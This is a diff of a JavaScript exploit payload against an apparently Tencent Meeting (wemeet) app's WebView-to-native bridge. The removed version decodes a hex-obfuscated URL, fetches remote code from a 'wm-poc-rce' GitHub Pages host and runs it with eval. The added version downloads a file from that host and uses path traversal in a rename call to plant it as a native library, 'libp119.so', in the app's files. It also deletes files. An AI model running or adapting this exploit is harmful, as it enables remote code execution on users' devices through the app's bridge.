@@ -1,37 +1,28 @@
 (function(){
-  document.title='P119TB:'+location.host;
-  window.__p=function(r){
+  document.title='P119PAY';
+  window.__p119=function(r){
     try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
-    document.title='P119CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,80);
+    try{JSCallJavaMgr.JSCallNative(JSON.stringify({module:'CommonPlugin',method:'PrintLog',param:{log:'P119CB='+JSON.stringify(r)},callId:'P119LOG'}))}catch(e){}
+    document.title='P119CB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,56);
   };
   function c(id,mod,m,p){
-    try{
-      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
-        callback:'window.__p',module:mod,method:m,param:p,callId:id
-      }));
-    }catch(e){
-      document.title='P119TB-NOJS:'+location.host;
-    }
+    document.title='P119RUN:'+id;
+    JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p119',module:mod,method:m,param:p,callId:id}));
   }
-  if(!window.JSCallJavaMgr){document.title='P119TB-NOMGR:'+location.host;return}
-  var js="javascript:void(function(){var h='68747470733a2f2f6769747768732e6769746875622e696f2f776d2d706f632d7263652f703131396d61696e2e6a73';var u='';for(var i=0;i<h.length;i+=2)u+=String.fromCharCode(parseInt(h.substr(i,2),16));fetch(u).then(function(r){return r.text()}).then(eval)})()";
+  if(!window.JSCallJavaMgr){document.title='P119-NOBRIDGE';return}
+  var ideaId='1';
   var q=[
-    ['H2','CommonPlugin','GetPerformance',{}],
-    ['JS','CommonPlugin','OpenNewPage',{
-      scheme:'wemeet://page/pay/main_process_webview',
-      router_params:{
-        url:js,
-        from_webView:true
-      }
-    }]
+    ['H0','CommonPlugin','GetPerformance',{}],
+    ['E1','IdeaWebViewPlugin','GetExportFileLocalPath',{idea_id:ideaId,fileName:'p50.zip'}],
+    ['E2','IdeaWebViewPlugin','GetExportFileLocalPath',{idea_id:ideaId}],
+    ['E3','CommonPlugin','GetExportFileLocalPath',{fileName:'p50.zip'}],
+    ['I1','IdeaWebViewPlugin','GetImageLocalPath',{idea_id:ideaId,cos_id:'1',url:'https://gitwhs.github.io/wm-poc-rce/p50.zip'}],
+    ['R1','IdeaWebViewPlugin','RenameImage',{idea_id:ideaId,old_name:'p50.zip',new_name:'libp119.so'}],
+    ['R2','IdeaWebViewPlugin','RenameImage',{idea_id:ideaId,src:'p50.zip',dst:'../../com.tencent.wemeet.app/files/lib/libp119.so'}],
+    ['D1','IdeaWebViewPlugin','DeleteExportFilePath',{fileName:'p40.bin'}],
+    ['D2','CommonPlugin','DeleteExportFilePath',{fileName:'p40.bin'}]
   ];
   var i=0;
-  function n(){
-    if(i>=q.length){document.title='P119TB-DONE:'+location.host;return}
-    var x=q[i++];
-    document.title='P119-RUN:'+x[0];
-    c(x[0],x[1],x[2],x[3]);
-    setTimeout(n, 4000);
-  }
-  setTimeout(n, 800);
+  function n(){if(i>=q.length){document.title='P119-DONE';return}var x=q[i++];c(x[0],x[1],x[2],x[3]);setTimeout(n,900)}
+  setTimeout(n,800);
 })();
